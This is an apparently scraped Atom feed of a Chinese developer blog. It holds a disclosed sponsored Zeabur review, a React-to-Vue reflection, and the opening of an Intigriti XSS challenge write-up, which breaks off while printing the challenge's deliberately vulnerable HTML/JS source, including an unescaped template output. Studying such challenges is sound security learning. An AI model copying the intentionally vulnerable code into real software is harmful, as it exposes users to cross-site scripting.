<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Huli&#39;s blog</title>
  
  <subtitle>Learning by sharing</subtitle>
  <link href="https://blog.huli.tw/atom.xml" rel="self"/>
  
  <link href="https://blog.huli.tw/"/>
  <updated>2024-04-25T11:47:32.105Z</updated>
  <id>https://blog.huli.tw/</id>
  
  <author>
    <name>Huli</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>快速部署網站的新選擇：Zeabur 使用心得</title>
    <link href="https://blog.huli.tw/2024/04/14/zeabur-introduction-deploy-service/"/>
    <id>https://blog.huli.tw/2024/04/14/zeabur-introduction-deploy-service/</id>
    <published>2024-04-14T02:40:00.000Z</published>
    <updated>2024-04-25T11:47:32.105Z</updated>
    
    <content type="html"><![CDATA[<p>以前當我想要部署一個簡單的服務時，我會去 Heroku 上面，因為簡單而且免費，雖然說還是有些使用限制，但整體而言還是很方便的，甚至還有一些簡單的 DB 可以用。如果是靜態網頁，會選擇 Netlify 或是 GitHub Pages，也都是簡單方便的選擇。</p><p>但 Heroku 從 2022 年年底之後就不再提供免費方案了，因此那時一堆人在尋找替代方案，包括 Render 或是 fly[dot]io 等等，都是很多人跳槽的新選擇。而我自己以前其實在 Heroku 上也有三四個專案，從 Heroku 改變方案之後就再也沒也動過了。</p><p>前陣子收到 <a href="https://zeabur.com/zh-TW">Zeabur</a> 創辦人的來信，希望有機會能跟我合作推廣這個平台，我自己試了之後發現體驗確實很不錯，因此就寫了這篇文章介紹一下。</p><span id="more"></span><h2><span id="zeabur-初體驗">Zeabur 初體驗</span></h2><p>Zeabur 是一個能夠幫你快速部署網站的服務，而且標榜的是簡單快速，幾乎不用額外多設定一些什麼，就能夠部署成功。</p><p>其實我之前已經聽過 Zeabur 一段時間了，但一直以來都沒機會使用，這次想說既然要合作，那我就拿之前放在 Heroku 卻死掉的專案來用好了。</p><p>在 Zeabur 後台新增一個 app 時，可以選擇用什麼方式部署：</p><p><img src="/img/zeabur-introduction-deploy-service/p1.png" alt="選擇部署方式"></p><p>我選了最方便的 GitHub，接下來就提供授權讓它可以訪問你的倉庫，就完成了。</p><p>對，是真的完成了。</p><p>選好 repo 的名稱按下去以後，就會自動開始 build 然後部署，大概過個一兩分鐘就會看到 running，已經跑起來了：</p><p><img src="/img/zeabur-introduction-deploy-service/p2.png" alt="部署完成"></p><p>跑起來之後記得去底下的「網路」那邊設定一個公開域名，才能訪問得到：</p><p><img src="/img/zeabur-introduction-deploy-service/p3.png" alt="設置域名"></p><p>我試了兩個以前放在 Heroku 的專案，一個是用 Node.js 寫的，另一個是用純 PHP（沒有任何框架），兩個專案都是點一下之後就自動跑後續流程，然後就完成了。</p><p>老實說這個體驗是真的滿令人驚豔的，真・一鍵部署，以前在用 heroku 的時候我記得創完 app 還要先下載什麼 heroku-cli，然後跑個指令再把程式碼推上去才會開始部署，相較之下 Zeabur 的體驗好很多（或許 Heroku 後來也有類似機制，但我還沒用到它就改方案了）。</p><p>而這個順暢的使用者體驗也是我會答應接下這個合作的主因。</p><h2><span id="收費方式">收費方式</span></h2><p>Zeabur 的計費方式滿複雜的，細節在這個頁面：<a href="https://zeabur.com/zh-TW/pricing">https://zeabur.com/zh-TW/pricing</a></p><p>先從免費版開始講，免費版的話只支援靜態網站（像是 GitHub Pages 那種）以及 serverless function（像是 AWS lambda 那種），靜態網站的部分我覺得沒有很吸引人，因為老實說 GitHub Pages 會是我更推薦的選擇，但 serverless 的部分倒是滿不錯的。</p><p>舉例來說，我有一個 Node.js 的 app 其實也沒幹嘛，就是一個簡單的 server 而且沒有 DB，這時候就很適合改成 serverless 的架構，就適用於免費版，可以一直當個免費仔。</p><p>但如果 serverless 沒辦法滿足你，就需要切成付費版，基本上每個月最少是 5 塊美金。他們的付費版會根據你用多少記憶體、CPU、儲存空間以及流量來收錢，無論有沒有用滿，最少就是 5 塊美金，而多的就再往上加。</p><p>那 5 塊錢美金大概是多少資源呢？</p><p>如果不算流量跟空間（這兩個相對便宜，如果正常使用的話）的話，每個月 512 MB 的記憶體是 2 塊美金，0.25 vCPU 是 3 塊美金，差不多就是這兩個加起來。</p><p>順帶一提，Zeabur 非常支持開源專案，所以如果你是開源專案的 maintainer 的話，可以聯繫 <a href="https://zeabur.com/docs/zh-TW/billing/sponsor">Zeabur</a>，開源專案本身就能獲得免費使用，而其他專案的 contributor 也能拿到 coupon。</p><h2><span id="zeabur-的優點與缺點">Zeabur 的優點與缺點</span></h2><p>對我來說 Zeabur 最大的優點是部署方便快速，許多專案點一下就可以部署了，不需要額外再寫什麼設定檔（不過我也只試過簡單的，沒試過更複雜的，所以不敢保證）。</p><p>再來的話滿多人喜歡他們的中文客服，畢竟這種 PaaS 大部分都是國外的，中文客服實屬難能可貴。</p><p>最後的話如果有很多小專案我覺得滿適合放上面的，因為計費是按照使用量來計算，例如說我有 5 個小專案，每個平均固定吃 100 MB 記憶體，CPU 使用也不大，那可能全部加起來就是月費五塊美金，滿划算的。</p><p>再來講講缺點。</p><p>最令人擔憂的點大概就是服務的持續性，畢竟新創公司的陣亡率大家都是知道的，有可能哪天營收不佳就整個收掉了，到時候要遷移專案也是挺麻煩的。</p><p>接著的話是穩定性，畢竟是規模比較小的公司，使用者也還沒有這麼多，不確定當使用者變多的時候，機器是不是能即時扛住，這點還需要時間來考驗。</p><h2><span id="適合使用-zeabur-的人">適合使用 Zeabur 的人</span></h2><p>如果你有個短期的專案需要找地方部署，又懶得自己去管那些機器以及設置環境，那我覺得 Zeabur 是個可以考慮的地方，畢竟方便而且價格又不貴。</p><p>這個短期專案可以是活動網站，也可以是面試的時候要拿來 demo 的專案等等。</p><p>或是你常常有很多小專案，沒有吃這麼多資源，也可以考慮 Zeabur，剛剛我也提過計費方式了，可以自己算一下是不是會比較划算。如果服務多而且吃的資源也比較多，去買每個月 5 塊、10 塊美金的 VPS 可能會是更划算的選擇（但要多花時間設置環境就是了）。</p><p>除此之外，Zeabur 也有提供很多寫好的模板，能夠幫你快速一鍵部署服務，例如說 <a href="https://vocus.cc/article/64be2c84fd8978000182de71">WordPress</a>，若是想要自己架一個的話，也可以考慮看看。</p><h2><span id="結語">結語</span></h2><p>以上就是對於 Zeabur 的介紹，雖然有提到說免費方案只能部署靜態網站以及 serverless，但其實不全然正確，因為目前免費方案也可以部署一般的那種容器化服務（一整個 server），只是會跳一個提示說隨時有可能被砍掉（畢竟沒付錢，而且是連信用卡都沒綁）。</p><p>因此，如果對 Zeabur 的服務有興趣，其實可以先註冊一個帳號去玩玩看，把自己服務放上去試試，如果真的覺得不錯再來付錢，讓服務穩定住在那邊。</p><p>這是有我推薦碼的連結，如果你用了之後有付費，我似乎會拿到 5 塊美金的 credit：<a href="https://zeabur.com/?referralCode=aszx87410">https://zeabur.com?referralCode=aszx87410</a></p><p>這是沒有我推薦碼的乾淨官方連結：<a href="https://zeabur.com/">https://zeabur.com</a></p><h2><span id="後記">後記</span></h2><p>之前跟 Zeabur 創辦人聊了一下合作方式，他們一開始提的就是有償的商業合作方案，這點值得鼓勵，我也認同主動找人合作推廣是要付費的。而我自己提出了用 Zeabur 的 credit 來替代現金的方式支付酬勞，他們也欣然同意。</p><p>不過我目前沒什麼 service 需要跑，因此這些 credit 我是用不完的，有點浪費，所以就決定把這些 credit 全部回饋給讀者。</p><p>如果你有服務想試試看 Zeabur 的付費方案，可以填寫底下這個表單：（活動已結束）</p><p>我會從中挑選 15 個人，每個人贈送 4 個月也就是 20 美金的使用額度，希望這些人能夠在使用完 Zeabur 之後寫一篇心得，幫助 Zeabur 變得更好。這個心得不是強制的，就算不寫也可以，而且內容不限，要講優點缺點都可以，非常自由。</p><p>表單預計會在 4&#x2F;25 左右關閉，如果有被選中的話，會在四月底的時候透過 email 通知。由於到時候獎勵會經由 email 直接發放，因此需要先註冊 Zeabur 再填寫表單。就如同我上面說的，雖然是免費方案但還是可以部署一般的 server，大家可以先註冊一個帳號玩玩看，覺得好用而且想要把更多東西放在上面，才來填寫表單參加活動。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;以前當我想要部署一個簡單的服務時，我會去 Heroku 上面，因為簡單而且免費，雖然說還是有些使用限制，但整體而言還是很方便的，甚至還有一些簡單的 DB 可以用。如果是靜態網頁，會選擇 Netlify 或是 GitHub Pages，也都是簡單方便的選擇。&lt;/p&gt;
&lt;p&gt;但 Heroku 從 2022 年年底之後就不再提供免費方案了，因此那時一堆人在尋找替代方案，包括 Render 或是 fly[dot]io 等等，都是很多人跳槽的新選擇。而我自己以前其實在 Heroku 上也有三四個專案，從 Heroku 改變方案之後就再也沒也動過了。&lt;/p&gt;
&lt;p&gt;前陣子收到 &lt;a href=&quot;https://zeabur.com/zh-TW&quot;&gt;Zeabur&lt;/a&gt; 創辦人的來信，希望有機會能跟我合作推廣這個平台，我自己試了之後發現體驗確實很不錯，因此就寫了這篇文章介紹一下。&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://blog.huli.tw/categories/Web/"/>
    
    
    <category term="Web" scheme="https://blog.huli.tw/tags/Web/"/>
    
  </entry>
  
  
  
  <entry>
    <title>從 React 到 Vue 的心得感想</title>
    <link href="https://blog.huli.tw/2024/03/13/from-react-to-vue/"/>
    <id>https://blog.huli.tw/2024/03/13/from-react-to-vue/</id>
    <published>2024-03-13T02:40:00.000Z</published>
    <updated>2024-03-13T11:10:27.551Z</updated>
    
    <content type="html"><![CDATA[<p>如果有看過我的部落格的話，應該會知道我一直都是寫 React，完全沒有碰過 Vue，也沒有碰過 Angular。自從 2015 年接觸到 React 後，工作上就一直是用 React 了。</p><p>然而，最近因為工作上的需求，所以開始寫 Vue 了，而剛好也有讀者來問我從 React 跳到 Vue 的心得，因此這邊就簡單寫一篇來分享。</p><span id="more"></span><h2><span id="在開始之前">在開始之前…</span></h2><p>雖然說要講從 React 跳到 Vue 的感想，但先讓我偷渡一下對於 Next.js 13.4，也就是 app router 搭配 RSC（React Server Components）的感想。照理來說應該要開另外一篇的，但篇幅不夠長，因此就偷渡在這裡了。</p><p>如果沒興趣的話，可以直接跳到下一段。</p><p>在目前的公司，React 跟 Vue 都會碰到，而且版本都滿新的，前者是 Next.js 14（剛用的時候是 13.4，第一個有 RSC 的版本），後者則是 Vue3。</p><p>因為都用了 Next.js 的最新版本，所以直上 RSC，想來體驗這個 React 未來的重點技術之一，先講結論：「不能只有我受苦，趕快來用」。</p><p>（話說如果還不清楚 RSC 是什麼，或是容易跟 SSR 搞混的話，建議可以先看這兩篇文章：<a href="https://github.com/reactwg/server-components/discussions/5">RSC From Scratch. Part 1: Server Components</a> 以及 <a href="https://vercel.com/blog/understanding-react-server-components">Understanding React Server Components</a>）</p><p>根據 RSC 的設計原則，如果運用得當的話，你的 bundle size 會變小，網站的性能也可能會變好，但我自己用過之後，認為它帶來的效益遠低於引進這項技術所增加的複雜度。</p><p>不過先強調一下，因為我用的是 Next.js 的 RSC，不代表所有的 RSC 都是同個樣子，所以這整段講的都會是「Next.js 的 RSC 的使用心得」，而不是「RSC 的使用心得」。</p><p>先來講缺點好了。</p><p>首先，光是要正確理解 client component 跟 server component 就需要一些時間，可能是嘗試的時間太早，甚至連 Next.js 的官方文件都寫得不是很清楚，需要自己一直不斷嘗試才能試出來到底是什麼樣子（例如說之前前端社群有一篇<a href="https://www.facebook.com/groups/f2e.tw/posts/6773381989365775/">貼文</a>就在問這個，我當初也有類似的疑惑）。</p><p>再來的話，未來在寫 component 的時候都會需要考慮到這個是 client 還是 server 還是都可以，會增加心智負擔。</p><p>還有就是許多 server component 可能會直接打 API 去拿資料，因此 client 在拿到資料時，就已經是 render 好的結果了。雖然乍看之下不錯（畢竟是 RSC 的賣點），但這其實會讓前端變得很難 debug。</p><p>以前除了第一次的 SSR 以外，我只要打開 DevTools，就可以看到前端發了哪些請求，API 的 response 是什麼，但換成 server component 以後我看不到了，我只能看 server log 才能知道發生了什麼事情。</p><p>如果出事的話，我從前端沒辦法區分出是我的 Next.js server 出錯，還是我呼叫的 API 那邊出錯，這點在開發者體驗上扣分許多。</p><p>但以上這些其實都還好，最雷的是 Next.js 13.4 的推出有點太趕，要嘛很多功能都沒有做好，要嘛是文件沒有寫清楚。</p><p>舉例來說，Next.js 有一個叫做 middleware 的東西，很直覺就會理解成是一個在處理 request 之前會執行到的檔案。但文件沒有寫清楚的是，這個 middleware 跟你其他的程式碼，是跑在不同的執行環境的（現在我記得已經有補上了，Next.js 的改版也滿勤快的就是了）。</p><p>也就是說在 middleware 裡面寫一個 <code>global.a = 1</code>，你到 Next.js 的 server component 裡面 log 出 <code>global.a</code>，答案會是 undefined。</p><p>再者，middleware 並不是跑在完整的 Node.js 環境上面，而是跑在一個叫做 <a href="https://nextjs.org/docs/app/building-your-application/rendering/edge-and-nodejs-runtimes">Edge Runtime</a> 的地方，有許多的功能跟 API 都不支援。</p><p>之所以這樣搞，是因為 Next.js 預設了這個 middleware 就是要跑在 edge 上，就算我們根本不會用到 edge 這個功能也一樣，而且目前依然沒辦法改變這點，更多討論可以看這一串：<a href="https://github.com/vercel/next.js/discussions/46722">Switchable Runtime for Middleware (Allow Node.js APIs in Middleware) #46722</a>。</p><p>順帶一提，我目前完全不支持把 Next.js 當一個全端框架來用，也就是前後端專案全都掛在 Next.js 上，理由很簡單，那就是它本來就不適合這樣用。Next.js 它所提供的 server 目前更像是 BFF（Back-end For Front-end），可以當作前端跟其他後端的橋樑，但沒辦法自己實作出完整的功能（除非你的專案很小，功能很少）。</p><p>如果真的把後端功能搬到 Next.js 上，那注定是場悲劇。</p><p>講完了缺點，來講講優點，那大概就是 bundle size 真的有小一點。例如說 i18n 好了，以往沒有特別做什麼調整的話，大部分的 client 都會下載到「超出目前使用範圍以外」的字串，例如說所有的中文字串，或至少是當前 namespace 底下的字串。</p><p>但用了 RSC 以後，由於 server component 的 i18n 在 server 直接做掉了，所以這部分就不需要下載任何額外的字串。</p><p>除此之外，其實我沒體驗到太大的好處（而且因為公司專案的一些特性，在搭配上同時有 client 跟 server component 需要考慮，現有的 i18n 套件每一個都有問題，只好自己簡單做了一套）</p><p>總之呢，我個人是不太推薦使用 app router 的，帶來的效益遠低於導入的成本，還會把很多事情弄得更複雜。我是從去年七八月就開始用 Next.js 13.4 了，那時候的狀況更糟，文件跟程式碼的行為配對不上的事情也發生過。</p><p>如果有人跟我說 Next.js 13.4 以後的 app router 超好用，那我會覺得要嘛是用得不夠多，要嘛是專案很小，所以沒有體驗到壞處，更何況我都還沒講那一堆預設開啟而且有些關不掉的<a href="https://nextjs.org/docs/app/building-your-application/caching">快取策略</a>。</p><p>以上就是偷渡的 Next.js RSC 心得，因為從去年七八月就開始用了，其實剛用的那兩三個月最有感，真的很多點可以吐槽，但現在已經有點忘了，我也害怕想起來。</p><h2><span id="從寫-react-轉去寫-vue-的感想">從寫 React 轉去寫 Vue 的感想</span></h2><p>話說這篇會盡量寫的是 React 與 Vue 本身的心得，而不是特定的函式庫或框架。</p><p>舉例來說，如果我原本在 React 都是用 Redux，轉到 Vue 之後用 Pinia，然後寫說：「哇，寫 Vue 真的太棒了啦，Pinia 好簡潔好好用，比 React 好太多了」，這個論述是有問題的，因為在 React 圈其實也有類似的 zustand 可以用。</p><p>所以這一句在比較的主體並不是 Vue 與 React，而是 Redux 與 Pinia，變成了特定函式庫的比較，這是這一篇想要避開的論述。</p><p>不過為了補充脈絡，還是先把這些函式庫與框架稍微講一下好了，React 的話目前我的起手式大概就是 Next.js 搭配 Zustand 搭配 tailwind，而 Vue 的話就是 Nuxt 搭配 Pinia 搭配 tailwind。</p><p>以使用體驗來說，我覺得兩個是差不多的（如果 Next.js 是 page router 的話），所以這部分就不多提了。</p><p>再來，使用的感想會與使用經驗多寡以及應用的專案有差，目前手邊大約有 4 個內部的中小型專案都用到 Vue，我寫 Vue 大概寫了四個月左右，其實也沒有很長，另外因為是內部工具，所以都沒有開啟 SSR，直接走純 client side render。</p><p>講完了這些前提以後，接著就來講講使用的感想，先來講我自己比較喜歡 Vue 的地方。</p><p>先講一下狀態管理的部分。</p><p>首先是 Vue 的雙向綁定真的滿香的，v-model 真的好用。以往在 React 都是 value + onChange 都寫，現在用 v-model 一行就搞定了。</p><p>而差異最大的我覺得在於 useEffect。在 React 中需要大量用到 useEffect 去處理一些事情，然後要考慮到 dependency 以及各種狀況，一不小心就可能寫壞。</p><p>但是在 Vue 中就沒有這種困擾，省了很多心智負擔，你要寫壞其實滿難的。</p><p>而這個特性的差異，也讓我對於專案的技術選擇多了一個思考的維度，那就是「下限」。以前我在思考技術時，比較容易思考到「一般的使用狀況」，像是我寫 React 寫久之後，其實不會特別覺得 useEffect 有什麼，寫得也算是順手。</p><p>但同時我也承認 useEffect 是一個需要經驗才能寫好的東西，有一定的學習門檻，這也表示它的下限可以很低。寫得爛的工程師，可以寫一堆 useEffect 然後 dependency 亂寫卻維持一個恐怖平衡，東西剛好可以動。若干年後如果我去接手，我會不知道從何改起，因為只要一往裡面加東西，就是整個壞掉，而且還是多個 effect 一起壞掉。</p><p>但我自己覺得 Vue 就不同了，你寫得再怎麼爛也就那樣了。同樣都是一個技術能力很差的人來寫，他所寫的 Vue 會比 React 好維護，我是這麼認為的，這就是我所說的「下限」。</p><p>那如果現在有個新的團隊，裡面都是前端超級新手，他們寫的專案你過半年之後要維護，已經可以預期到維護性可能會較差的情況下，選擇下限比較高的 Vue 似乎會比較好，至少你改得動。</p><p>而另外一個也是從團隊出發的角度是「上手難度」，如果團隊內的人手比較不足，前後端要互相支援的話，那 Vue 也是個會比 React 更好的選擇，因為更好入門，所以就算不熟悉前端也能夠快速上手。</p><p>總之呢，從狀態管理來看的話，我覺得 Vue 更直覺也更好上手一點，而 React 的話確實是比較複雜。</p><p>接著來談 render 的方式，React 就是 JSX 一路到底，整個 component 就是一個 function，裡面是 JSX。而 Vue 的話則是把 template 跟 functional 分開，我覺得兩者各有其優劣。</p><p>對於一些需要 early return 的狀況，例如說如果是載入中就只顯示 loading，React 我覺得會更加直覺一點，就 component 看個前幾行就知道了。而 Vue 的話則是 setup 的地方看完還要再回去看 template 才能確定。</p><p>除此之外，v-if 與 v-for 那些其實滿好用的，而且 template 看起來也比較整齊，在結構沒有相差很多的情況下可讀性比較好。</p><p>優點講完了，來講一些缺點。</p><p>第一個缺點是在 props 的部分我覺得 React 更加直覺，就是 function 的參數而已，而 Vue 的話則是要額外定義，而且在傳入的時候提倡的是 kebab-case，原本叫做 <code>testProps</code> 要改成 <code>test-props</code>，我自己不是很喜歡這樣，因為兩者不一致的話會導致搜尋有點困難。</p><p>雖然說我看文件也是可以用 <code>testProps</code>，但官方文件提倡的作法依然是 <code>test-props</code>。</p><p>第二個缺點是一個檔案只能有一個 component，我覺得這個滿不彈性的，會容易出現一大堆小的檔案。雖然以前也有人在 React 中提倡這種做法，一個檔案一個 component，但我認為那是不好的，因為有些 component 如果不能被其他元件重用，那就應該放在同個檔案，比較好找也比較好維護。</p><p>不過這點似乎也可以解決，我有查到相關的方法：</p><ol><li><a href="https://michaelnthiessen.com/multiple-components-in-one-file">Multiple Components in One File</a></li><li><a href="https://codewithhugo.com/writing-multiple-vue-components-in-a-single-file/">Writing multiple Vue components in a single file</a></li></ol><p>這樣看下來，好像我上面提的兩個缺點其實都有方法可以解決，純粹是我之前對 Vue 不夠熟所以不知道而已，之後再來試試看。</p><h2><span id="總結">總結</span></h2><p>以上就是我對使用 Next.js 13.4 app router + RSC 的心得，以及從寫 React 轉到寫 Vue 的心得。</p><p>總之呢，感想大概就是 Vue 確實簡單好上手，但還需要再觀察一陣子，畢竟 code 寫得越多才會越有感覺，像我這種只寫了三四個月的，通常還在甜蜜期，只體驗到好處而非壞處。當寫的程式碼愈多，專案也愈複雜的時候，應該就會遇到一些之前沒碰過的問題。</p><p>或許要再寫個一兩年才會有更多心得吧？不知道那時候的前端會長成什麼樣子。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;如果有看過我的部落格的話，應該會知道我一直都是寫 React，完全沒有碰過 Vue，也沒有碰過 Angular。自從 2015 年接觸到 React 後，工作上就一直是用 React 了。&lt;/p&gt;
&lt;p&gt;然而，最近因為工作上的需求，所以開始寫 Vue 了，而剛好也有讀者來問我從 React 跳到 Vue 的心得，因此這邊就簡單寫一篇來分享。&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Intigriti 0124 XSS 筆記</title>
    <link href="https://blog.huli.tw/2024/02/17/intigriti-0124-writeup/"/>
    <id>https://blog.huli.tw/2024/02/17/intigriti-0124-writeup/</id>
    <published>2024-02-17T04:40:00.000Z</published>
    <updated>2024-02-17T10:53:39.068Z</updated>
    
    <content type="html"><![CDATA[<p>上個月（2024 年 1 月）的 Intigriti 挑戰非常有趣，出題者是 <a href="https://twitter.com/kevin_mizu">@kevin_mizu</a>，之前也常在推特上看到他出一些 client-side 相關的題目，而這次的題目品質也一如既往的很好，值得寫一篇紀錄。</p><p>題目的連結在這邊，沒有看過的話可以先去看看：<a href="https://challenge-0124.intigriti.io/">https://challenge-0124.intigriti.io/</a></p><span id="more"></span><h2><span id="似乎比想像中簡單">似乎比想像中簡單？</span></h2><p>題目的程式碼滿簡短的，先來看前端的部分，基本上就是一個 HTML 而已：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Intigriti XSS Challenge<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/main.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Hey &lt;%- name %>,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>Which repo are you looking for?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;%= search %><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/img/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loading<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50px<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>avatar<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>35%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>homepage<span class="token punctuation">"</span></span> <span class="token attr-name">hidden</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/js/axios.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/js/jquery-3.7.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token 